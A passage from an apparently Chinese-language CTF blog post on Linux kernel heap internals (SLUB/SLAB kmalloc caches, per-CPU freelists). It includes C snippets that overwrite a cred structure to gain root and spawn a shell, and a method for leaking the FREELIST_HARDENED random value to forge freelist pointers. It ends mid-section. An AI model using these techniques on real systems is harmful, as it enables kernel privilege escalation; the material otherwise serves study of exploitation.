      <p><code>kmalloc_caches[0][1]~kmalloc_caches[0][13]</code>为<code>kmalloc-8</code>~`kmalloc-8k`</p>
<p><code>kmalloc_caches[1][1]~kmalloc_caches[1][13]</code>为<code>kmalloc-rcl-8</code>~`kmalloc-rcl-8k`</p>
<p><code>kmalloc_caches[2][1]~kmalloc_caches[2][13]</code>为<code>dma-kmalloc-8</code>~`dma-kmalloc-8k`</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131600906.png" alt="image-20220313160048795"></p>
<p>内存管理如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131521126.png" alt="img"></p>
<p>在二维空间的<code>kmalloc_caches</code>下，依据CPU的不同，有不同的<code>freelist</code>，比如在有4个CPU的情况下，我们将程序绑定在CPU3上，如上面提到的一样</p>
<p>qemu启动效果之后，输入top，效果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141202734.png" alt="image-20220314120253236"></p>
<p>那么我们的<code>itExp</code>程序绑定的CPU3分配到的基地址即为<code>0xffff88800f380000</code>，结合<code>kmalloc_caches</code>中对应<code>kmalloc-xxx</code>下的<code>cpu_slab.freelist </code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141209330.png" alt="image-20220314120914190"></p>
<p>那么我们的<code>kmalloc-32</code>的<code>freelist</code>即为<code>0xffff88800f380000+0x2d260</code>，如下图可以看到，我们释放的chunk确实是放入了CPU3上对应的<code>kmalloc-32</code>的<code>freelist</code>中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162026812.png" alt="image-20220316202605604"></p>
<p>当然，在SLUB分配下，由于FD指针的存在，freelist更像是一个单向链表，freelist中的第一个chunk作为链表头依据FD指针串联起整个freelist</p>

        <h4 id="仅SLAB下"   >
          <a href="#仅SLAB下" class="heading-link"><i class="fas fa-link"></i></a><a href="#仅SLAB下" class="headerlink" title="仅SLAB下"></a>仅SLAB下</h4>
      <p>同样也具备多维或者一维的<code>kmalloc_caches</code></p>
<p><code>kmalloc_caches[0][1]~kmalloc_caches[0][2]</code>为<code>kmalloc-96~kmalloc-192</code></p>
<p><code>kmalloc_caches[0][3]~kmalloc_caches[0][4]</code>不知道为什么没有</p>
<p><code>kmalloc_caches[0][5]~kmalloc_caches[0][22]</code>为<code>kmalloc-32~kmalloc-4M</code></p>
<p>同理对应的多维和一维也是类似的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131601774.png" alt="image-20220313160119681"></p>
<p>分配方式上有点不同，具体的比较复杂，可以参考如下：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/liuhangtiant/category_7929217.html" >(41条消息) slab内存管理方案学习记录_liuhangtiant的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这种情况下的Chunk其实不带FD指针的，所以只用于<code>freelist</code>上即可，简单来说，slab的<code>freelist</code>更像是一个数组进行索引。</p>
<ul>
<li>首先找到索引，也就是<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.avail</code>对应的值，以<code>CPU3</code>和<code>kmalloc-1024</code>为例：</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162039052.png" alt="image-20220316203909895"></p>
<ul>
<li>然后再找到<code>freelist</code>的地址，即<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162040465.png" alt="image-20220316204056370"></p>
<p>其实通过观察我们可以知道，<code>entry</code>其实也就是<code>cpu_cache+0x10</code>而已。那么现在我们得到freelist的地址，就将其当作一个数组进行取用，比如这里的索引idx为2，那么我们下一次分配就会取freelist[2]这个obj，但是这里很奇怪，这个索引是从1开始的，如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162046044.png" alt="image-20220316204603914"></p>
<p>下一次分配取到<code>chunk</code>是<code>0xffff88800d538400</code>而非<code>0xffff88800d538c00</code>，我感觉这个索引idx更像是一个计数，表示还剩2个chunk可用，从尾部开始取用</p>

        <h5 id="🔺注："   >
          <a href="#🔺注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：" class="headerlink" title="🔺注："></a>🔺注：</h5>
      <p>当然以上的情况实际操作起来太麻烦，还不如写个小插件，自己进行计算</p>
<p>参考自己写的小工具：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll" >PIG-007/kernelAll (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h6 id="SLAB："   >
          <a href="#SLAB：" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLAB：" class="headerlink" title="SLAB："></a>SLAB：</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162049003.png" alt="image-20220316204859800"></p>

        <h6 id="SLUB："   >
          <a href="#SLUB：" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUB：" class="headerlink" title="SLUB："></a>SLUB：</h6>
      <p>这个带上了计算swab和random值得功能，也就是开启了harden的情况下，当然也还有FD偏移位置改变的情况，不过需要设置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162051067.png" alt="image-20220316205100876"></p>

        <h3 id="修改cred结构体"   >
          <a href="#修改cred结构体" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改cred结构体" class="headerlink" title="修改cred结构体"></a>修改cred结构体</h3>
      <p>这个就不用说太多，通常是0xa8大小的结构体，清空前28字节</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> credBuf[<span class="number">0xa8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">addFun(fd,<span class="number">0xa8</span>,credBuf);</span><br><span class="line">freeFun(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">idFork = fork();</span><br><span class="line"><span class="keyword">if</span>(idFork == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//get into 28*0 to set uid and gid 0</span></span><br><span class="line">    editFun(fd,<span class="number">0</span>,<span class="number">28</span>,credBuf);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]welcome root:\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(idFork &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]fork fail\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="修改FD申请"   >
          <a href="#修改FD申请" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改FD申请" class="headerlink" title="修改FD申请"></a>修改FD申请</h3>
      
        <h4 id="1-HARDENED保护"   >
          <a href="#1-HARDENED保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-HARDENED保护" class="headerlink" title="(1)HARDENED保护"></a>(1)HARDENED保护</h4>
      <p>不过从4.14的内核版本开始，就存在<code>freelist_ptr</code>加密了，不过需要在编译内核的时候加入<code>CONFIG_SLAB_FREELIST_HARDENED</code>选项来启用，并且加密形式在不同版本不太一样。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.14</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v5.16</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span></span><br><span class="line"><span class="comment">	 * Normally, this doesn&#x27;t cause any issues, as both set_freepointer()</span></span><br><span class="line"><span class="comment">	 * and get_freepointer() are called with a pointer with the same tag.</span></span><br><span class="line"><span class="comment">	 * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span></span><br><span class="line"><span class="comment">	 * example, when __free_slub() iterates over objects in a cache, it</span></span><br><span class="line"><span class="comment">	 * passes untagged pointers to check_object(). check_object() in turns</span></span><br><span class="line"><span class="comment">	 * calls get_freepointer() with an untagged pointer, which causes the</span></span><br><span class="line"><span class="comment">	 * freepointer to be restored incorrectly.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			swab((<span class="keyword">unsigned</span> <span class="keyword">long</span>)kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>ptr</code>即当前释放的chunk地址，ptr_addr为指向下一个free_chunk的地址，所以中间相当于有一个random值不知道。这个值在<code>linux/slub_def.h</code>中被定义</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>并且在<code>mm/slub.c</code>中的<code>kmem_cache_open</code>函数中被赋值</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kmem_cache_open</span><span class="params">(struct kmem_cache *s, <span class="keyword">slab_flags_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这里需要我们获得random的值，这个值保存在对于size的kmem_cache中，该结构体定义在<code>/linux/slub_def.h</code>中如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.17</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;	<span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset;	<span class="comment">/* Free pointer offset. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> reserved;		<span class="comment">/* Reserved bytes at the end of slabs */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>并且不同size的kmem_cache对应的random不同。</p>
<p>在有DEBUG信息的内核中，我们尝试寻找0x10大小的kmem_cache比如我们寻找0x10大小的就需要在保存所有kmem_cache的全局变量结构kmalloc_caches中寻找，不过需要注意的是，好像很多时候不是按照顺序来排布的，如下图，我们就需要寻找kmalloc-16，但是这里它的索引为4，而不是2，不知道为什么。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161521037.png" alt="image-20220116152127879"></p>
<p>另外kmalloc_caches[0]并不是一个kmem_cache结构的，而是一个其他类型，暂时不知道用来干啥。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524450.png" alt="image-20220116152404345"></p>
<p>那么回到正题，先寻找下random，这个就是0x10大小的kmem_cache中保存的random值了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524429.png" alt="image-20220116152450367"></p>
<p>那么我们得到random值就可以算出下一个chunk在哪里了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161527850.png" alt="image-20220116152702584"></p>
<p>但是通常意义上如果开启了这个保护，我们是得不到堆地址的，最多得到保护之后的fd的值，没办法算出来random的值，但是由于是异或了当前堆地址ptr和堆地址+size(ptr_addr)，那么我们对size做文章，这样可以找出一些规律。</p>
<p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-15" >slub堆溢出的利用 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h5 id="🔺注：-1"   >
          <a href="#🔺注：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：-1" class="headerlink" title="🔺注："></a>🔺注：</h5>
      <p>在该内核下的同一个size的kmem_cache的random值不管启动多少次都是固定的，无论有没有开启KASLR。（至少我在本地测的时候是如此的）</p>

        <h6 id="未开启KASLR"   >
          <a href="#未开启KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#未开启KASLR" class="headerlink" title="未开启KASLR"></a>未开启KASLR</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243725.png" alt="image-20220118124309671"></p>

        <h6 id="开启KASLR"   >
          <a href="#开启KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#开启KASLR" class="headerlink" title="开启KASLR"></a>开启KASLR</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243644.png" alt="image-20220118124331545"></p>
<p>可以看到都是一致的。</p>
<p>但是放到题目中就不太确定了，就是将题目在本地运行测出来的random值和题目在远程运行测出来的random值是不是也是一样的呢，之前的西湖的easy_kernel题中貌似是一样的，但是我并没有实际测试，因为还没碰到..下回换个机器测试下。或者说和qemu还是环境cpu都有关系吗，期待大佬回答。</p>
<p>而且在后面的<strong>新版的HARDENED</strong>中也有提到，加入swab运算之后，貌似会对random值再做一个低2个字节的处理，这个是怎么处理的呢，还是有点不太懂。</p>

        <h5 id="①0x8为例"   >
          <a href="#①0x8为例" class="heading-link"><i class="fas fa-link"></i></a><a href="#①0x8为例" class="headerlink" title="①0x8为例"></a>①0x8为例</h5>
      <p>0x10对齐的堆块其fd均一样，取其fd直接异或0x8即可得到kmalloc-8的random值</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161703956.png" alt="image-20220116170303600"></p>
<p>原因如下，0x10对齐的堆块异或其值+0x8并不会造成进位，所以异或得到的值都是一样的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161707520.png" alt="image-20220116170714710"></p>

        <h5 id="②0x10，0x20，0x30等等"   >
          <a href="#②0x10，0x20，0x30等等" class="heading-link"><i class="fas fa-link"></i></a><a href="#②0x10，0x20，0x30等等" class="headerlink" title="②0x10，0x20，0x30等等"></a>②0x10，0x20，0x30等等</h5>
      <p>这种类型的其fd和random值一般差半个字节，大不了直接爆破，1/16的概率</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161750717.png" alt="image-20220116175038466"></p>
<p>并且观察可以发现，在0x10的情况下也会有重复的部分，同样的，该重复的部分异或0x10也会是random值</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161752331.png" alt="image-20220116175228263"></p>
<p>具体的还是自己摸索或者看一只狗师傅的：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-16" >slub堆溢出的利用 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h5 id="泄露random"   >
          <a href="#泄露random" class="heading-link"><i class="fas fa-link"></i></a><a href="#泄露random" class="headerlink" title="泄露random"></a>泄露random</h5>
      <p>以下泄露Random样例也是参照一只狗师傅的</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">2</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">Show(<span class="number">0</span>, &amp;FD1, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">1</span>, &amp;FD2, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">2</span>, &amp;FD3, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> random;</span><br><span class="line"><span class="keyword">if</span>(FD1==FD3)</span><br><span class="line">    random = FD1^<span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    random = FD2^<span class="number">0x100</span>;</span><br></pre></td></tr></table></div></figure>


        <h5 id="获得堆地址任意写"   >
          <a href="#获得堆地址任意写" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得堆地址任意写" class="headerlink" title="获得堆地址任意写"></a>获得堆地址任意写</h5>
      <p>但是获得堆地址不太好整，需要找到freelist的最后一个堆块last_chunk，然后其fd异或random即可得到该堆块的地址，获得堆块地址后，直接释放该堆块last_chunk，然后通过之前一个堆块pre_chunk溢出或者UAF，按照异或规则修改last_chunk的fd，就能实现任意申请了。</p>
<p>以8192大小为例，申请到最后一个chunk时释放，然后再申请就能申请回来了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161815160.png" alt="image-20220116181547997"></p>
<p>注意获取堆地址的时候，由于不同size的kmem_cache的最大freelist数量差异较大，size越大的其freelist链表个数越少，越容易申请到最后一个。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161744323.png" alt="image-20220116174436185"></p>

        <h4 id="2-HARDENED新版改动"   >
          <a href="#2-HARDENED新版改动" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-HARDENED新版改动" class="headerlink" title="(2)HARDENED新版改动"></a>(2)HARDENED新版改动</h4>
      
        <h5 id="kasan-reset-tag"   >
          <a href="#kasan-reset-tag" class="heading-link"><i class="fas fa-link"></i></a><a href="#kasan-reset-tag" class="headerlink" title="kasan_reset_tag"></a>kasan_reset_tag</h5>
      <p>从v5.0开始，加了一个新的东西</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr));</span><br></pre></td></tr></table></div></figure>

<p>这个不知道用来干啥的，有点蒙圈</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//linux/kasan.h</span><br><span class="line">static inline void *kasan_reset_tag(const void *addr)</span><br><span class="line">&#123;</span><br><span class="line">	return (void *)addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h5 id="swab"   >
          <a href="#swab" class="heading-link"><i class="fas fa-link"></i></a><a href="#swab" class="headerlink" title="swab"></a>swab</h5>
      <p>从v5.6.4开始，又加了一个运算</p>
